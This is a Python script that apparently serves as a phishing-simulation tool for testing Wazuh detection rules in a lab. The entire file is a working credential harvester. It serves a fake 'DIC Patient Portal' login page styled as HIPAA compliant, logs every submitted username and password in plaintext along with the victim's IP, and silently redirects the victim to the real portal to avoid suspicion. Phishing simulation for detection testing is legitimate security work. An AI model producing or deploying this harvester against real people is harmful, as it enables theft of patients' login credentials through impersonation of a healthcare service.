#!/usr/bin/env python3
"""
phish_server.py — Credential harvesting server for phishing simulation.
Simulates a fake DIC patient portal that captures submitted credentials.
Triggers Wazuh Rules: 100012, 100013
"""
import logging
import os
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs

LOG_FILE = "/var/log/phish_captures.log"
os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)

logging.basicConfig(
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(),
    ],
    level=logging.INFO,
    format="%(asctime)s %(message)s",
)

PHISH_PAGE = b"""<!DOCTYPE html>
<html><head><title>DIC Patient Portal</title>
<style>
body{font-family:Arial,sans-serif;background:#1565c0;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
.container{background:white;padding:40px;border-radius:8px;width:380px;box-shadow:0 8px 32px rgba(0,0,0,0.3)}
h2{color:#1565c0;margin-bottom:8px;text-align:center}
p{color:#666;font-size:13px;text-align:center;margin-bottom:24px}
.field{margin-bottom:16px}
label{display:block;font-size:13px;font-weight:600;color:#333;margin-bottom:6px}
input{width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:6px;font-size:14px}
button{width:100%;padding:12px;background:#1565c0;color:white;border:none;border-radius:6px;font-size:15px;cursor:pointer;margin-top:8px}
button:hover{background:#0d47a1}
.footer{font-size:11px;color:#999;text-align:center;margin-top:16px}
</style></head>
<body><div class='container'>
<h2>&#127973; DIC Patient Portal</h2>
<p>Please log in to access your imaging results</p>
<form method='POST' action='/login'>
<div class='field'><label>Username / Patient ID</label><input name='username' placeholder='Enter username' required></div>
<div class='field'><label>Password</label><input type='password' name='password' placeholder='Enter password' required></div>
<button type='submit'>Log In</button>
</form>
<div class='footer'>&#128274; Secure connection | HIPAA Compliant</div>
</div></body></html>"""

CAPTURED = []


class PhishHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass  # suppress default output

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(PHISH_PAGE)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", errors="replace")
        params = parse_qs(body)
        creds = {k: v[0] for k, v in params.items()}
        src_ip = self.client_address[0]

        CAPTURED.append({"ip": src_ip, "creds": creds})
        logging.info(f"CAPTURED CREDENTIALS from {src_ip}: {creds}")
        print(f"\n[PHISH] >>> CREDENTIAL CAPTURED from {src_ip}")
        print(f"         Username : {creds.get('username', '???')}")
        print(f"         Password : {creds.get('password', '???')}")
        print(f"         Total captured: {len(CAPTURED)}")

        # Redirect victim to "real" portal (seamless)
        self.send_response(302)
        self.send_header("Location", "https://patient.dic.lab/")
        self.end_headers()


if __name__ == "__main__":
    port = int(os.environ.get("PHISH_PORT", 8888))
    print(f"\n[PHISH] Credential harvester started on :{port}")
    print(f"[PHISH] Access at: http://0.0.0.0:{port}/login")
    print(f"[PHISH] Captures logged to: {LOG_FILE}")
    print(f"[PHISH] This triggers Wazuh Rules 100012 and 100013\n")
    HTTPServer(("0.0.0.0", port), PhishHandler).serve_forever()
